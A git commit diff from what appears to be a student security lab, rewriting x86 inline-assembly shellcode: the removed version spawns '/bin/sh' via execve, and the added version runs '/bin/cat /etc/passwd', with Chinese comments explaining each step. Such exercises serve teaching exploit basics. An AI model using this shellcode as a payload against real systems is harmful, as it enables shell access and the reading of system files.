e0b1a85f8cf7b9b29444328cb2626d95440cd9aa
Qmm <1259598502@qq.com>
2025-04-13 20:21:20 +0800

    exp3: task2 re

--- exp3/shell_asm.c
+++ exp3/shell_asm.c
@@ -1,22 +1,28 @@
 // gcc -o asm_shell ../shell_asm.c
-void foo()
-{
-    __asm__(
-        "xor    %edx,%edx ;"
-        "push   %edx ;"
-        "push   $0x68732f6e ;"
-        "push   $0x69622f2f ;"
-        "mov    %esp,%ebx ;"
-        "push   %edx ;"
-        "push   %ebx ;"
-        "mov    %esp,%ecx ;"
-        "lea    0xb(%edx),%eax ;"
-        "int    $0x80;" //"sysenter ;"
-    );
+void foo() {
+  __asm__("xor    %edx,%edx ;"
+
+          "push   %edx ;"
+          "push   $0x64777373 ;" /* "sswd" */
+          "push   $0x61702f2f ;" /* "//pa" */
+          "push   $0x6374652f ;" /* "/etc" */
+          "mov    %esp,%esi ;"   /* 保存 "//etc/passwd" 的地址到 esi */
+
+          "push   %edx ;"        /* NULL 终止符 */
+          "push   $0x7461632f ;" /* "/cat" */
+          "push   $0x6e69622f ;" /* "/bin" */
+          "mov    %esp,%ebx ;"   /* ebx = 程序路径 "/bin/cat" */
+
+          "push   %edx ;"
+          "push   %esi ;" 
+          "push   %ebx ;"
+          "mov    %esp,%ecx ;"
+          "lea    0xb(%edx),%eax ;"
+          "int    $0x80;" //"sysenter ;"
+  );
 }
 
-int main(int argc, char * argv[])
-{
-    foo();  return 0;
+int main(int argc, char *argv[]) {
+  foo();
+  return 0;
 }
-
